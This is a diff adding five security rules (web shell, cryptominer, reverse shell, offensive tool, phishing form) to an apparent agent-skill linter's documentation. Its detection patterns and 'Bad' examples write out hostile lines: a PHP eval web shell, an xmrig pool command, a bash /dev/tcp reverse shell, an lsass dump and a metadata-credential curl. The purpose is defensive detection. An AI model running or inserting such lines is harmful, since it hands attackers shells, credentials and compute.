@@ -1477,6 +1477,11 @@ does not override it; a rule that reports mild and serious cases at different le
 | AR043 | `persistence-mechanism` | warning | A command in a script, a fenced block or an inline code span that installs something which outlives the session: `crontab -e`, `crontab -` or `crontab <file>` (not `crontab -l`), `launchctl load/bootstrap/enable/submit`, `systemctl enable/link/preset`, `update-rc.d ... defaults`, `chkconfig ... on`, `schtasks /create`, `Register-ScheduledTask`, a `Run` registry key, a macOS login item, or a write (`>`, `tee`, `cp`, `mv`, `ln`, `install`, a file-write call) into a LaunchAgents/LaunchDaemons, systemd unit, `cron.d`, `init.d`, `rc.local` or autostart path. An append to a shell startup file (`>> ~/.zshrc`, `tee -a ~/.bashrc`, `sed -i` on it) is reported as info because setup guides do it. Prose, DOM identifiers such as `pList` and a `PLIST` variable are not reported, and neither are example regions, comment lines or text under a negation ("never run") |
 | AR044 | `unsafe-deserialization` | warning | A call that rebuilds objects from data and can run code: `pickle`/`cPickle`/`dill`/`cloudpickle` `load(s)`, `pandas.read_pickle`, `marshal.load(s)`, `jsonpickle.decode`, `yaml.load`/`yaml.unsafe_load` without `SafeLoader`, `CSafeLoader` or `BaseLoader`, `torch.load` without `weights_only=True`, `numpy.load(allow_pickle=True)`, PHP `unserialize` (except with `allowed_classes => false`), Ruby `Marshal.load`, `YAML.load` and `Oj.load` in object mode, Java `ObjectInputStream`, `XMLDecoder` and `enableDefaultTyping`, and `node-serialize`. Only scripts, fenced blocks and inline code spans are read, and a call needs its parenthesis (a span `pickle.loads` in prose is not a call). A script is matched with the rules of its language by extension; example regions, comment lines and text under a negation are skipped. `yaml.load` is left alone in a file that mentions `ruamel` |
 | AR045 | `internal-endpoint-request` | warning | A request to a cloud metadata endpoint (`169.254.169.254`, `100.100.100.200`, `metadata.google.internal`, `fd00:ec2::254`) in a script, fenced block or code span that holds a URL or a fetch command, or in prose that tells the agent to fetch, query or read it. A request to the Docker (`2375`, `2376`), etcd (`2379`), kubelet (`10250`, `10255`) or Kubernetes API (`6443`) port of `localhost` is reported as info. A bare address, a deny list, a line that blocks, rejects, validates or filters, text under a negation ("never fetch"), explanatory prose without a request verb and example regions are not reported. Other local ports (a dev server on `8001`, Elasticsearch on `9200`) are not reported |
+| AR046 | `web-shell` | warning | PHP, Python, JSP or ASPX code that runs a command or evaluates code taken from the HTTP request: `system($_GET[...])`, `$_POST['f']($_POST['a'])`, `assert(base64_decode(...))`, `preg_replace` with the `/e` modifier, `exec(request.form[...])`, `os.system(request.args[...])`, `Runtime.getRuntime().exec(request.getParameter(...))`, `Process.Start(Request.Form[...])`. A line AR005 already reported (an `eval` of dynamic text) is not repeated. Reading a request field as data is not reported; a negated markdown line ("never write ...") is skipped |
+| AR047 | `cryptominer` | warning | A mining pool URL (`stratum+tcp://host:port`), miner flags (`-o pool:port -u wallet`; an `https://` URL with `-u` is not one), or a browser coin-mining library (CoinHive, CryptoLoot, JSEcoin, WebMinerPool, DeepMiner). A bare miner program name (`xmrig`, `cpuminer`, `cgminer`, `nbminer`, ...) is reported as info |
+| AR048 | `reverse-shell` | warning | A command that attaches an interactive shell to a socket: `bash -i >& /dev/tcp/host/port 0>&1`, `exec 5<>/dev/tcp/...`, `nc`/`ncat -e sh`, a `mkfifo` relay into `nc`, `socat` joining `exec:sh` and `tcp:`, Python `os.dup2(sock.fileno(), 0)`, a PowerShell `TCPClient` stream into `iex`, PHP `fsockopen` with a command runner. A port probe (`nc -zv host 22`, `echo > /dev/tcp/host/port`) is not reported. Command-shaped: example regions and `example_paths` are skipped |
+| AR049 | `offensive-tool` | info | A penetration-testing or credential-dumping tool is named (Metasploit, Mimikatz, Cobalt Strike, SharpHound, Impacket, CrackMapExec, sqlmap, LaZagne, Rubeus, ...). A credential-dump command is a warning: `sekurlsa::`, `lsadump::`, `procdump` of `lsass`, `reg save hklm\sam` (or `security`, `system`), `secretsdump.py`, `comsvcs.dll ... MiniDump`, `ntdsutil ... ifm`. Tool names stay at info because product lists and defensive documentation name them. Example regions are skipped |
+| AR050 | `phishing-kit-form` | info | An HTML form whose action is a local `*.php` script named login, signin, verify, secure or account and that holds a password input within 400 characters of the tag |
 | AR805 | `body-empty` | warning | A skill, agent, command or rule has frontmatter but nothing (or only whitespace) after it |
 | AR806 | `fence-unclosed` | warning | A fenced code block (```` ``` ```` or `~~~`) that is opened and never closed, so the rest of the file is read as code. Fixable: closes the fence at the end of the file |
 | AR807 | `final-newline-missing` | info | A content file whose last line has no newline. Fixable: adds one (CRLF files get CRLF) |
@@ -2004,6 +2009,60 @@ a command or script requests a cloud metadata endpoint (169.254.169.254, metadat
 - Why: The metadata endpoint of a cloud host answers with the credentials of its instance role to any process that asks, and the administration ports of local services accept commands from a request; an agent that fetches them hands those to whoever steered it.
 - Bad: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
 - Good: Use the credentials the user configured; never request the metadata service
+### AR046 web-shell
+
+PHP, Python, JSP or ASPX code that runs a command or evaluates code taken from the HTTP request (eval($_POST[...]), exec(request.form[...]), Runtime.exec(request.getParameter(...)), Process.Start(Request.Form[...])) or an obfuscated eval chain
+
+- Default severity: `warning`
+- Analyzer: `security` (scope `item`)
+- Why: A script that passes request input to eval or a command runner gives whoever can reach it a remote shell; a skill that ships one is a backdoor.
+- AR005 reports an eval of dynamic text; AR046 covers the request-to-exec shapes of PHP, Python, JSP and ASP.NET and is not repeated on a line AR005 already reported. A line in a markdown block that documents a bad example ("never ...") is skipped.
+- Bad: `<?php eval($_POST['c']); ?>`
+- Good: Handle request fields as data; never execute them
+
+### AR047 cryptominer
+
+a mining pool URL (stratum+tcp://), miner command-line flags (-o pool:port -u wallet) or a browser coin-mining library (CoinHive and its successors); a bare miner program name is reported as info
+
+- Default severity: `warning`
+- Analyzer: `security` (scope `item`)
+- Why: A mining pool address, miner flags or a browser mining script spends the user's CPU for someone else's wallet.
+- A bare miner program name is reported as info; a pool URL, pool flags or a coinjacking library as warning.
+- Bad: `xmrig -o stratum+tcp://pool.example:3333 -u WALLET -p x`
+- Good: Remove the miner; a skill that needs compute should say so and use the user's own infrastructure
+
+### AR048 reverse-shell
+
+a command that hands an interactive shell to a remote host: bash -i >& /dev/tcp/host/port, nc/ncat -e sh, a mkfifo-and-nc relay, socat exec:sh, a Python os.dup2 socket loop, a PowerShell TCPClient loop
+
+- Default severity: `warning`
+- Analyzer: `security` (scope `item`)
+- Why: A reverse shell connects the machine to a remote host that then types commands into it.
+- The pattern needs the shell to be attached to a socket (/dev/tcp redirection, nc -e, mkfifo relay, socat exec, os.dup2 of a socket, a TCPClient stream into iex). A plain port check such as `nc -zv host 22` is not reported. Example regions are skipped.
+- Bad: `bash -i >& /dev/tcp/203.0.113.7/4444 0>&1`
+- Good: Use ssh or the project's remote-access tooling, documented and authenticated
+
+### AR049 offensive-tool
+
+a penetration-testing or credential-dumping tool is named (Metasploit, Mimikatz, Cobalt Strike, ...); warning when the line is a credential-dump command (sekurlsa::, lsadump::, procdump of lsass, reg save of the SAM hive, secretsdump.py)
+
+- Default severity: `info`
+- Analyzer: `security` (scope `item`)
+- Why: Credential dumping commands read secrets from process memory or registry hives; offensive tool names mark skills that carry or use attack tooling.
+- A tool name alone (Metasploit, Mimikatz, ...) is info because defensive and product documentation names them too; a credential-dump command is a warning. Example regions are skipped.
+- Bad: `procdump -ma lsass.exe lsass.dmp`
+- Good: Describe detection or hardening without running the dump
+
+### AR050 phishing-kit-form
+
+an HTML form posts a password field to a local login/signin/verify/secure/account PHP script, the shape of a credential-harvesting page
+
+- Default severity: `info`
+- Analyzer: `security` (scope `item`)
+- Why: A form that posts a password to a local login, signin, verify, secure or account PHP script is the page shape of a credential-harvesting kit.
+- The form must carry a password input within 400 characters of the tag. Forms to other targets are not reported.
+- Bad: `<form action="signin.php"><input type="password"></form>`
+- Good: Post to the real identity provider over HTTPS, or leave login pages out of skills
 
 ### AR101 glob-no-match
 
